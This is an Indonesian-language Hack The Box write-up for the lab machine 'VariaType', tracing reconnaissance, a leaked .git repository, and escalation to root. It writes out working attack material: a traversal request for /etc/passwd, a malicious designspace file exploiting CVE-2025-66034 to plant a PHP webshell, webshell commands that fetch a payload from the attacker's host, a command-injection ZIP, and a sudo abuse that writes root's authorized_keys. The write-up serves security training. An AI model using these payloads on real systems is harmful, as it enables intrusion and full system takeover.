# VariaType — HackTheBox Write-up

> **Platform:** Hack The Box  
> **Nama Mesin:** VariaType  
> **Tingkat Kesulitan:** Medium  
> **OS:** Linux  
> **Status:** Retired  

---

## Daftar Isi

1. [Tentang Mesin](#tentang-mesin)
2. [Koneksi ke HTB](#koneksi-ke-htb)
3. [Enumerasi Nmap](#enumerasi-nmap)
4. [Konfigurasi Host Resolution](#konfigurasi-host-resolution)
5. [Penemuan Git Repository yang Terbuka](#penemuan-git-repository-yang-terbuka)
6. [Ekstraksi Repository Git](#ekstraksi-repository-git)
7. [Analisis Riwayat Git](#analisis-riwayat-git)
8. [Autentikasi dan File Disclosure](#autentikasi-dan-file-disclosure)
9. [Pengembangan Eksploit — CVE-2025-66034](#pengembangan-eksploit--cve-2025-66034)
10. [Remote Code Execution](#remote-code-execution)
11. [Pembuatan SSH Key](#pembuatan-ssh-key)
12. [Persiapan Privilege Escalation](#persiapan-privilege-escalation)
13. [Pengiriman Payload](#pengiriman-payload)
14. [Akses User dan Pengambilan Flag](#akses-user-dan-pengambilan-flag)
15. [Enumerasi Privilege Escalation](#enumerasi-privilege-escalation)
16. [Persiapan Akses Root](#persiapan-akses-root)
17. [Hosting Root Public Key](#hosting-root-public-key)
18. [Privilege Escalation ke Root](#privilege-escalation-ke-root)

---

## Tentang Mesin

VariaType adalah mesin Linux dengan tingkat kesulitan **Medium** di platform Hack The Box yang menggambarkan bagaimana serangkaian miskonfigurasi yang dirantai bersama, ditambah praktik pengembangan yang tidak aman, bisa berujung pada kompromi sistem secara penuh.

Serangan dimulai dengan **enumerasi Nmap** untuk menemukan port yang terbuka, dilanjutkan dengan pengaturan resolusi host agar aplikasi web dapat diakses dengan benar. Dari sana, ditemukan sebuah **direktori `.git` yang terbuka secara publik**, memungkinkan ekstraksi seluruh repository dan analisis riwayat commit untuk menemukan kredensial yang pernah di-hardcode namun tidak terhapus dari histori.

Menggunakan kredensial tersebut, autentikasi ke portal berhasil dilakukan, mengungkap kerentanan **directory traversal** pada endpoint unduhan file. Fokus kemudian beralih ke **CVE-2025-66034**, sebuah celah Arbitrary File Write melalui XML Injection pada `fontTools.varLib`, yang dieksploitasi untuk menulis PHP webshell ke dalam web root dan memperoleh **Remote Code Execution (RCE)**.

Setelah mendapatkan eksekusi perintah, dilakukan pembuatan SSH key pair, diikuti dengan pengiriman payload ZIP berbahaya yang menyalahgunakan pemrosesan tidak aman dari scheduled task, sehingga berhasil menyuntikkan public key ke direktori `.ssh` milik user `steve`. Akses SSH pun terbuka.

Pada tahap akhir, ditemukan aturan `sudo` yang salah konfigurasi yang mengizinkan eksekusi skrip Python sebagai root. Skrip tersebut dimanfaatkan untuk menulis SSH key root ke `/root/.ssh/authorized_keys`, memberikan **akses penuh sebagai root**.

Secara keseluruhan, mesin ini menyoroti bahaya nyata dari repository yang terbuka, penanganan file yang tidak aman, dan manajemen hak akses yang lemah.

![Tampilan Mesin VariaType di HackTheBox](gambar/01-machine-info.png)

---

## Koneksi ke HTB

Langkah pertama adalah menghubungkan terminal Kali Linux ke jaringan Hack The Box melalui VPN. Perintah yang dijalankan:

```bash
sudo openvpn ~/Downloads/OpenVPN/variatype.ovpn
```

![Koneksi VPN ke Hack The Box berhasil](gambar/02-vpn-connect_01.png)

![Koneksi VPN ke Hack The Box berhasil_02](gambar/02-vpn-connect_02.png)

Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.42.177**.

![Mesin VariaType aktif dengan IP yang ditetapkan](gambar/03-machine-started.png)

---

## Enumerasi Nmap

Dengan IP target di tangan, pemindaian Nmap dijalankan untuk mengidentifikasi port yang terbuka beserta layanan yang berjalan di dalamnya:

```bash
nmap -sC -sV -A -O -T4 -oN variaType_nmap.txt 10.129.42.177
```

![Hasil pemindaian Nmap pada mesin VariaType](gambar/04-nmap-scan.png)

Hasil pemindaian mengungkap dua port yang aktif:

- **Port 22 (SSH)** — menjalankan OpenSSH 9.2p1 di atas Debian
- **Port 80 (HTTP)** — dilayani oleh nginx 1.22.1, yang langsung melakukan redirect ke `variatype.htb`

Adanya redirect ke domain virtual host mengisyaratkan bahwa nama domain tersebut perlu ditambahkan secara manual ke file `/etc/hosts` agar bisa diakses dengan benar. Sementara SSH disimpan sebagai opsi akses berbasis kredensial untuk tahap berikutnya, fokus utama diarahkan ke enumerasi web.

---

## Konfigurasi Host Resolution

Karena layanan web melakukan redirect ke domain kustom, entri baru harus ditambahkan ke file resolusi host lokal agar permintaan bisa diarahkan dengan tepat:

```bash
echo "10.129.42.177 variatype.htb" | sudo tee -a /etc/hosts
```

![Penambahan entri host untuk variatype.htb](gambar/05-hosts-config.png)

### Penemuan subdomain `portal` menggunakan ffuf
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    -H "Host: FUZZ.variatype.htb" -u http://variatype.htb -mc 200,302,401,403
```
![Penambahan entri host untuk portal.variatype.htb](gambar/05-hosts-config_ffuf.png)

Selain domain utama, subdomain `portal.variatype.htb` juga ditambakan karena terdeteksi saat melakukan pemindaia subdomain menggunaka ffuf. Dengan konfigurasi ini, interaksi dengan aplikasi web dapat berjalan sebagaimana mestinya — bukan sekadar menggunakan alamat IP mentah.

Setelah resolusi host siap, penelusuran terhadap kedua domain pun dimulai untuk memetakan fungsionalitas yang tersedia.

---

## Penemuan Git Repository yang Terbuka

Saat melakukan enumerasi pada subdomain `portal.variatype.htb` menggunakan feroxbuster, ditemukan sebuah miskonfigurasi kritis: 
```bash
feroxbuster -u http://portal.variatype.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --scan-dir-listings
```
![Direktori .git terbuka secara publik pada portal.variatype.htb_01](gambar/git_subdir_found.png)

Direktori `.git` dapat diakses secara publik melalui browser maupun permintaan HTTP biasa:

```bash
curl http://portal.variatype.htb/.git/HEAD
```

![Direktori .git terbuka secara publik pada portal.variatype.htb](gambar/06-git-exposure.png)

Respons yang dikembalikan adalah:

```
ref: refs/heads/master
```

Konfirmasi ini menunjukkan bahwa repository Git di server dapat diakses sepenuhnya dari luar. Artinya, seluruh source code aplikasi — termasuk konfigurasi dan potensi kredensial — berpotensi bisa diambil.

Temuan ini dikategorikan sebagai **information disclosure kritis**, dan langkah selanjutnya adalah mengekstrak isi repository tersebut untuk dianalisis secara offline.

---

## Ekstraksi Repository Git

Setelah memastikan direktori `.git` dapat diakses, sebuah tool digunakan untuk mengotomasi proses pengambilan repository secara menyeluruh. Pertama, tool tersebut diinstal:

```bash
pip install git-dumper
```

![Instalasi git-dumper untuk mengekstrak repository yang terbuka](gambar/07-git-dumper-install.png)

Kemudian repository diambil dari target:

```bash
git-dumper http://portal.variatype.htb/.git ./portal-repo
```

![Proses ekstraksi repository Git dari server target](gambar/08-git-dump.png)

Output menampilkan serangkaian respons `200 OK` untuk file-file Git penting seperti `HEAD`, `config`, `index`, dan berbagai object file — membuktikan bahwa repository dapat direkonstruksi secara lokal. Tool secara otomatis menjalankan `git checkout` untuk membangun kembali working tree, memberikan akses penuh ke source code aplikasi.

Tahap berikutnya adalah menelusuri kode tersebut untuk mencari informasi sensitif seperti kredensial, kunci API, atau celah keamanan lainnya.

---

## Analisis Riwayat Git

Dengan repository berhasil diunduh, penelusuran terhadap histori commit dimulai untuk menggali informasi yang mungkin pernah tersimpan namun kemudian dihapus:

```bash
cd portal-repo
git log --oneline
```

![Daftar commit pada repository yang berhasil diekstrak](gambar/09-git-log.png)

Salah satu commit menyebut nama pengguna **gitbot**, yang langsung menarik perhatian. Untuk menemukan commit yang mungkin sudah dihapus atau tidak lagi terhubung ke branch aktif, digunakan perintah berikut:

```bash
git fsck --no-reflog --full --unreachable | grep commit
```

![Penemuan unreachable commit melalui git fsck](gambar/10-git-fsck.png)

Hasilnya mengungkap adanya **unreachable commit** — sebuah indikasi bahwa konten yang pernah dihapus masih tersimpan dalam objek Git. Commit tersebut kemudian diperiksa secara langsung:

```bash
git show 6f021da6be7086f2595befaa025a83d1de99478b
```

![Isi unreachable commit yang mengandung kredensial hardcoded](gambar/11-git-show.png)

Pesan commit bertuliskan *"remove hardcoded credentials"*, dan diff-nya memperlihatkan kredensial milik user `gitbot` yang pernah tertanam langsung dalam kode. Meski sudah dihapus dari versi terkini, data tersebut tetap bisa diakses melalui histori Git — memberikan jalur masuk yang valid untuk eksploitasi berikutnya.

---

## Autentikasi dan File Disclosure

Memanfaatkan kredensial `gitbot` yang ditemukan dari riwayat Git, proses autentikasi ke portal dilakukan dan session cookie disimpan untuk digunakan pada permintaan selanjutnya:

![Autentikasi berhasil menggunakan kredensial gitbot dari histori Git](gambar/12-auth-login.png)

Setelah mengekstrak `PHPSESSID` dari proses autentikasi sebelumnya, dilakukan percobaan akses ke endpoint unduhan file dengan memanfaatkan parameter yang mencurigakan:

```bash
curl -s -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" \
    "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
```

![Directory traversal berhasil membaca /etc/passwd dari server](gambar/13-file-disclosure.png)

Server mengembalikan isi file `/etc/passwd` secara lengkap, mengonfirmasi adanya **kerentanan directory traversal** pada parameter endpoint tersebut. Dari output yang diperoleh, teridentifikasi user bernama `steve` — informasi yang akan berguna pada tahap selanjutnya.

Meski demikian, endpoint `download.php` ini hanya menawarkan akses baca file, sehingga diputuskan untuk mencari vektor serangan yang lebih menjanjikan.

---

## Pengembangan Eksploit — CVE-2025-66034

Setelah menyadari bahwa `download.php` bukan jalur yang optimal, fokus beralih ke celah yang lebih berbahaya: **CVE-2025-66034**, sebuah kerentanan Arbitrary File Write melalui XML Injection pada library `fontTools.varLib`.

Langkah pertama adalah membuat dua file font minimal yang diperlukan sebagai referensi dalam designspace berbahaya:

```bash
python3 generate_fonts.py
```

![Pembuatan font source-light.ttf dan source-regular.ttf untuk eksploit](gambar/14-font-generation.png)

File `source-light.ttf` dan `source-regular.ttf` berhasil dibuat. Selanjutnya, sebuah file `.designspace` berbahaya dikonstruksi dengan menyematkan PHP webshell di dalam blok CDATA, sekaligus menentukan path output ke lokasi yang dapat diakses melalui web:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
	<axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
	        <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]]]><![CDATA[>]]></labelname>
	        <labelname xml:lang="fr">MEOW2</labelname>
	    </axis>
	</axes>
	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
	<sources>
		<source filename="source-light.ttf" name="Light">
			<location>
				<dimension name="Weight" xvalue="100"/>
			</location>
		</source>
		<source filename="source-regular.ttf" name="Regular">
			<location>
				<dimension name="Weight" xvalue="400"/>
			</location>
		</source>
	</sources>
	<variable-fonts>
		<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
			<axis-subsets>
				<axis-subset name="Weight"/>
			</axis-subsets>
		</variable-font>
	</variable-fonts>
</designspace>
```
(isi file `malicious2.designspace`)

Tujuan dari konstruksi ini adalah mengeksploitasi pipeline pemrosesan font untuk menulis file PHP berisi webshell langsung ke dalam web root server, membuka jalan menuju eksekusi perintah dari jarak jauh.

---

## Remote Code Execution

Setelah semua file siap — designspace berbahaya beserta dua font pendukungnya — ketiganya diunggah ke endpoint pemrosesan font yang rentan:

```bash
curl -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious2.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" -i --follow -s
```

![Upload file berbahaya ke endpoint pemrosesan font](gambar/15-file-upload.png)

Server merespons dengan pesan **"Processing completed"**, menandakan bahwa payload berhasil diproses. Karena designspace mengarahkan output ke dalam web root, kemungkinan besar file PHP sudah tertulis di sana. Verifikasi dilakukan dengan mengakses shell tersebut:

```bash
curl -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=id" --output hasil_rce.txt
```

---

## Pembuatan SSH Key

```bash
ssh-keygen -t ed25519 -f steve_key -N "" -C "steve_variatype"
```

Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase.

![Pembuatan SSH key steve](gambar/17-pembuatan_ssh_steve.png)

Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.

## Persiapan Privilege Escalation

Untuk mendapatkan akses sebagai `steve`, perlu ada mekanisme yang menyuntikkan public key ke direktori `.ssh`-nya. Cara yang dipilih adalah membuat arsip ZIP berbahaya yang mengeksploitasi kerentanan command injection dalam alur pemrosesan font — kemungkinan besar dijalankan oleh scheduled job berbasis FontForge.

```bash
python3 make_zip.py
```

![Pembuatan evil.zip dengan nama file yang mengandung command injection](gambar/18-evil-zip.png)

Skrip ini menyematkan public key SSH langsung ke dalam nama file menggunakan command substitution. Saat arsip diproses oleh sistem target, perintah tersebut akan dieksekusi, menciptakan file `authorized_keys` di direktori `.ssh` milik `steve` dan memasukkan public key ke dalamnya. Setelah `evil.zip` siap, langkah selanjutnya adalah mengirimkannya ke target.

---

## Pengiriman Payload

Untuk menyerahkan arsip berbahaya ke sistem target, sebuah HTTP server sederhana dijalankan secara lokal agar file bisa diunduh dari sana:

```bash
python3 -m http.server 80
```

![Python HTTP server aktif untuk melayani evil.zip](gambar/19-http-server.png)

Dari log server, terlihat permintaan `GET /evil.zip` masuk — bukti bahwa target berhasil mengambil file tersebut. Namun untuk memastikan payload benar-benar tersalin ke lokasi yang diproses oleh scheduled task, webshell digunakan untuk secara eksplisit mengunduhnya ke server:

```bash
curl -I -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://10.10.14.3/evil.zip%20/var/www/portal.variatype.htb/public/files/ev1l.zip" --output hasil_rce.txt
```

![Payload evil.zip berhasil diunduh ke direktori target melalui webshell](gambar/20-payload-delivery.png)

Dengan payload sudah berada di lokasi yang tepat, tinggal menunggu scheduled job memprosesnya. Begitu itu terjadi, public key akan tersuntikkan ke `authorized_keys` milik `steve`, dan akses SSH pun siap dibuka.

---

## Akses User dan Pengambilan Flag

Setelah menunggu beberapa saat agar payload diproses, koneksi SSH dicoba menggunakan private key yang telah dibuat sebelumnya:

```bash
ssh -i steve_key steve@10.129.42.177
```

![SSH berhasil masuk sebagai user steve](gambar/21-ssh-user-access.png)

Koneksi berhasil terhubung tanpa meminta password — mengonfirmasi bahwa public key sudah tersuntikkan dengan sukses ke `authorized_keys` milik `steve`. Identitas user diverifikasi dengan menjalankan `whoami`, yang mengembalikan output `steve`. User flag kemudian diambil dari direktori home:

```bash
cat ~/user.txt
```

![SSH berhasil masuk sebagai user steve](gambar/user-txt.png)

Akses penuh sebagai user `steve` telah terbukti. Kini saatnya beralih ke tahap eskalasi privileges untuk meraih kontrol penuh atas sistem.

---

## Enumerasi Privilege Escalation

Setelah mendapatkan shell SSH sebagai `steve`, enumerasi dimulai untuk mengidentifikasi jalur yang memungkinkan peningkatan hak akses:

```bash
sudo -l
```

![Output sudo -l menampilkan aturan yang bisa dieksploitasi](gambar/22-sudo-enum.png)

Hasil perintah mengungkap bahwa `steve` diizinkan menjalankan skrip Python tertentu sebagai root tanpa memerlukan password:

```
(ALL) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Aturan `sudo` ini sangat menarik karena skrip menerima argumen tambahan (ditandai dengan `*`), mengisyaratkan kemungkinan penyalahgunaan melalui manipulasi input. Dengan skrip tersebut berjalan di bawah hak root, analisis mendalam terhadapnya menjadi prioritas berikutnya dalam rangka menguasai sistem sepenuhnya.

---

## Persiapan Akses Root

Setelah mengidentifikasi skrip yang bisa dieksploitasi, sebuah SSH key pair baru disiapkan khusus untuk akses root:

```bash
ssh-keygen -t ed25519 -f root_key -N "" -C "root_variatype"
```

![Pembuatan SSH key pair untuk akses root](gambar/23-root-keygen.png)

Dua file dihasilkan: `root_key` sebagai private key dan `root_key.pub` sebagai public key. Strategi yang direncanakan adalah memanfaatkan skrip Python yang berjalan dengan hak root untuk menulis isi `root_key.pub` ke dalam file `/root/.ssh/authorized_keys`, sehingga akses SSH langsung sebagai root bisa dilakukan menggunakan private key yang dimiliki.

---

## Hosting Root Public Key

Agar skrip Python yang berjalan sebagai root bisa mengambil public key dari mesin penyerang, sebuah HTTP server disiapkan untuk melayani file tersebut:

```bash
cd root
python3 handler_root.py
```

![HTTP server berjalan untuk melayani root_key.pub](gambar/24-key-hosting.png)

Server ini dikonfigurasi untuk mengembalikan konten `root_key.pub` setiap kali ada permintaan masuk. Dengan server aktif, target siap diperintahkan untuk mengambil file tersebut melalui skrip Python yang dijalankan dengan sudo.

---

## Privilege Escalation ke Root

Dengan semua persiapan selesai, eksploitasi final dijalankan. Skrip Python yang bisa dieksekusi sebagai root dimanfaatkan untuk mengambil public key dari mesin penyerang dan menulisnya langsung ke `/root/.ssh/authorized_keys`:

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.3:9090/%2Froot%2F.ssh%2Fauthorized_keys
```

![Eksploitasi sudo berhasil menulis root public key ke authorized_keys](gambar/25-privesc-exploit.png)

Output mengonfirmasi bahwa file berhasil diunduh dan dipasang di `/root/.ssh/authorized_keys`. Koneksi SSH sebagai root pun langsung dicoba:

```bash
ssh -i root_key root@10.129.42.177
```

![SSH sebagai root berhasil — sistem berhasil dikuasai sepenuhnya](gambar/26-root-access.png)

Shell root terbuka. flag root berhasil diambil:

```bash
cat root.txt
```

![ROOT_FLAG](gambar/root-txt.png)

---

## Rangkuman Serangan

| Tahap | Teknik | Hasil |
|---|---|---|
| Reconnaissance | Nmap scan | Port 22, 80 ditemukan |
| Web Enumeration | Virtual host discovery | `variatype.htb`, `portal.variatype.htb` |
| Information Disclosure | Git repository exposure | Source code dan histori commit dapat diakses |
| Credential Harvesting | Git history analysis | Kredensial `gitbot` ditemukan |
| File Read | Directory traversal via `download.php` | Konfirmasi user `steve` |
| RCE | CVE-2025-66034 — XML Injection + Arbitrary File Write | PHP webshell tertanam di web root |
| Persistence | SSH key injection via malicious ZIP | Akses SSH sebagai `steve` |
| Privilege Escalation | Misconfigured `sudo` rule pada Python script | Akses penuh sebagai `root` |

---

## Pelajaran yang Bisa Dipetik

- **Jangan pernah membiarkan direktori `.git` dapat diakses publik** di server produksi. Gunakan konfigurasi web server atau `.htaccess` untuk memblokirnya.
- **Histori Git menyimpan segalanya** — menghapus kredensial dari kode terbaru tidak cukup; riwayat commit tetap menyimpannya. Gunakan `git filter-branch` atau `BFG Repo-Cleaner` untuk menghapus data sensitif secara permanen.
- **Validasi ketat pada input yang diterima untuk pemrosesan file** sangat penting. Nama file, path, dan konten XML harus disanitasi sebelum diproses.
- **Aturan `sudo` harus dirumuskan seketat mungkin** — hindari penggunaan wildcard (`*`) yang memungkinkan injeksi argumen tidak terduga.
- **Scheduled task yang memproses file dari direktori yang dapat ditulis pengguna** menciptakan permukaan serangan yang sangat berbahaya.
